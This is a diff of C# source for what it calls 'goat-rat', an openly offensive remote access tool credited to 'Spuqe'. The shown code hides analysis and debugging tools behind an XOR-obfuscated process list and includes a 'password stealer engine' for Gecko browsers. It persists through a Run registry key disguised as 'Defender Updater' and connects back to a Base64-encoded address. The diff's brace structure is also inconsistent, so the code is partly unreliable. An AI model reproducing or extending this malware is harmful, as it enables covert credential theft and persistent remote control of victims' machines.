@@ -1,143 +1,163 @@
-﻿using System;
-using System.IO;
-using System.Net;
-using System.Linq;
-using System.Text;
-using Crying.Reader;
-using Crying.Helpers;
-using System.Threading;
-using System.Reflection;
-using System.Diagnostics;
-using Microsoft.VisualBasic;
-using System.ServiceProcess;
-using System.Collections.Generic;
-using static Crying.Helpers.Common;
-using System.Net.NetworkInformation;
+﻿    //  ------------------------------  //
+    //  |      Made By Spuqe         |  //
+    //  |      -------------         |  //
+    //  |  https://github.com/spuqe  |  //
+    //  ------------------------------  //
+
+
+    // Libraries    
+    #region Lib
+    using System;
+    using System.IO;
+    using System.Net;
+    using System.Linq;
+    using System.Text;
+    using Crying.Reader;
+    using Crying.Helpers;
+    using System.Drawing;
+    using System.Net.Http;
+    using System.Threading;
+    using System.Reflection;
+    using System.Diagnostics;
+    using System.Windows.Forms;
+    using Microsoft.VisualBasic;
+    using System.ServiceProcess;
+    using System.Threading.Tasks;
+    using System.Collections.Generic;
+    using static Crying.Helpers.Common;
+    using System.Net.NetworkInformation;
+    using System.Runtime.InteropServices;
+    using System.Collections.Specialized;
+    using System.Text.RegularExpressions;
+
+    #endregion
 
     // Varis = blocks known applications using XOR cipher
     #region VariksenPelätin
-    class ProgramStarter
-    {
-        // xor
-        #region
-        static string xor(string text, int n = 256)
-        {
-            byte[] input = Encoding.UTF8.GetBytes(text);
-            byte[] output = new byte[input.Length];
-            int i = 0;
-            foreach (byte b in input)
+        class ProgramStarter
             {
-                output[i] = (byte)(b ^ n);
-                i++;
-            }
-            return Encoding.UTF8.GetString(output);
-        }
-        #endregion
-
-        public static bool Starter()
-        {
-            string[] list = new string[] {
-            "QOTCUNGTM",
-            "OBGW",
-            "IJJ_BDA",
-            "RGUMKAT",
-            "VTIECUUNGEMCT",
-            "VTIEC^V",
-            "BHUV_",
-            "OBGW",
-            "OKKSHOR_BCDSAACT",
-            "QOTCUNGTM",
-            "BSKVEGV",
-            "NIIMC^VJITCT",
-            "OKVITRTCE",
-            "VCRIIJU",
-            "JITBVC",
-            "U_UOHUVCERIT",
-            "VTIEyGHGJ_\\CT",
-            "U_UGHGJ_\\CT",
-            "UHO@@yNOR",
-            "QOHBDA",
-            "LICDI^EIHRTIJ",
-            "@OBBJCT",
-            "LICDI^UCTPCT",
-            "OBG",
-            "OBG",
-            "PKRIIJUB",
-            "PKQGTCRTGR",
-            "PKQGTCSUCT",
-            "PKGERNJV",
-            "PDI^UCTPOEC",
-            "PDI^RTG_",
-            "MUBSKVCT",
-            "TCEJGUHCR",
-            "^BDA",
-            "IJJ_BDA",
-            "VTIATCUURCJCTOM@OBBJCTQCDBCDSAACT",
-            "^BDA",
-            "MUBSKVCT",
-            "NRRVBCDSAACT"
-
-        };
-
-            foreach (Process p in Process.GetProcesses())
-            {
-                foreach (string name in list)
+                // xor
+                #region
+                static string xor(string text, int n = 256)
                 {
-                    if (xor(p.ProcessName.ToLower(), 38).Contains(name))
+                    byte[] input = Encoding.UTF8.GetBytes(text);
+                    byte[] output = new byte[input.Length];
+                    int i = 0;
+                    foreach (byte b in input)
                     {
-                        return true;
+                        output[i] = (byte)(b ^ n);
+                        i++;
                     }
+                    return Encoding.UTF8.GetString(output);
                 }
-            }
+                #endregion
 
-            return false;
+                public static bool Starter()
+                {
+                    string[] list = new string[] {
+                        "QOTCUNGTM",
+                        "OBGW",
+                        "IJJ_BDA",
+                        "RGUMKAT",
+                        "VTIECUUNGEMCT",
+                        "VTIEC^V",
+                        "BHUV_",
+                        "OBGW",
+                        "OKKSHOR_BCDSAACT",
+                        "QOTCUNGTM",
+                        "BSKVEGV",
+                        "NIIMC^VJITCT",
+                        "OKVITRTCE",
+                        "VCRIIJU",
+                        "JITBVC",
+                        "U_UOHUVCERIT",
+                        "VTIEyGHGJ_\\CT",
+                        "U_UGHGJ_\\CT",
+                        "UHO@@yNOR",
+                        "QOHBDA",
+                        "LICDI^EIHRTIJ",
+                        "@OBBJCT",
+                        "LICDI^UCTPCT",
+                        "OBG",
+                        "OBG",
+                        "PKRIIJUB",
+                        "PKQGTCRTGR",
+                        "PKQGTCSUCT",
+                        "PKGERNJV",
+                        "PDI^UCTPOEC",
+                        "PDI^RTG_",
+                        "MUBSKVCT",
+                        "TCEJGUHCR",
+                        "^BDA",
+                        "IJJ_BDA",
+                        "VTIATCUURCJCTOM@OBBJCTQCDBCDSAACT",
+                        "^BDA",
+                        "MUBSKVCT",
+                        "NRRVBCDSAACT"
 
-        }
-    #endregion
+                    };
+
+                    foreach (Process p in Process.GetProcesses())
+                    {
+                        foreach (string name in list)
+                        {
+                            if (xor(p.ProcessName.ToLower(), 38).Contains(name))
+                            {
+                                return true;
+                            }
+                        }
+                    }
+
+                    return false;
+
+                }
+                #endregion
 
     // Lepakko = Password stealer engine. Steals from all gecko browsers.
     #region Lepakko
     class lepakko
     {
-    static void LepakkoMies(string[] args)
-    {
-        // Get command line args
-        string arguments = string.Join(" ", args).ToLower();
-        if (string.IsNullOrEmpty(arguments))
+        static void LepakkoMies(string[] args)
         {
-            Console.WriteLine("passwords/cookies/history/bookmarks");
-            Environment.Exit(1);
-        }
-
-        foreach (string browser in Profile.GetMozillaBrowsers())
-        {
-            // Show info
-            Console.WriteLine("Reading " + arguments + " from " + new DirectoryInfo(browser).Name + " browser.");
-
-            // :::::::DDDDDDD VITTU KEKSI t: Viljami
-            // Get cookies
-
-            // Get history
-            if (arguments.Equals("history"))
+            // Get command line args
+            string arguments = string.Join(" ", args).ToLower();
+            if (string.IsNullOrEmpty(arguments))
             {
-                foreach (Site history in History.Get(browser))
+                Console.WriteLine("passwords/cookies/history/bookmarks");
+                Environment.Exit(1);
+            }
+
+            foreach (string browser in Profile.GetMozillaBrowsers())
+            {
+                // Show info
+                Console.WriteLine("Reading " + arguments + " from " + new DirectoryInfo(browser).Name + " browser.");
+
+                // :::::::DDDDDDD VITTU KEKSI t: Viljami
+                // Get cookies
+
+                // Get history
+                if (arguments.Equals("history"))
                 {
-                    Console.WriteLine(BrowserUtils.FormatHistory(history));
+                    foreach (Site history in History.Get(browser))
+                    {
+                        Console.WriteLine(BrowserUtils.FormatHistory(history));
+                    }
                 }
             }
+            Console.WriteLine("DONE");
         }
-        Console.WriteLine("DONE");
     }
-}
 
     #endregion
+
+
 
     // Connecting engine, Starter engine, FailFast engine runner, Commands.
     #region RShell
     static class Rshell
     {
 
-        static string address = "YourIPinBase64"; // Your IP address in Base64
+        static string address = "aHR0cDovLzEyNy4wLjAuMTo4MDgwLw=="; // Your IP address in Base64
         static string version = "spuqe";
 
         static string token = Utils.RandomString(15);
@@ -161,15 +181,20 @@ using System.Net.NetworkInformation;
             Microsoft.Win32.RegistryKey key = Microsoft.Win32.Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
             key.SetValue("Defender Updater", Application.ExecutablePath);
         }
-        
+
         static void Main()
         {
+            //Console.ForegroundColor = ConsoleColor.DarkGreen;
+            //Console.WriteLine($"You are now connected to {address}");
+            //Console.WriteLine($"Using goat-rat remote tool version {version}");
+            //Console.WriteLine($"Tool made by https://github.com/spuqe");
+            //Console.WriteLine("\n" + Environment.MachineName + "\n" + Environment.UserName + "\n" + Utils.GetOSName() + "\n" + Utils.IsAdministrator());
 
             //connect
             new Thread(Join).Start();
+            Runner();
             Startup();
         }
-
 
         static void Join()
         {
@@ -513,4 +538,5 @@ using System.Net.NetworkInformation;
             address = Encoding.UTF8.GetString(Convert.FromBase64String(address));
         }
     }
+}
             #endregion
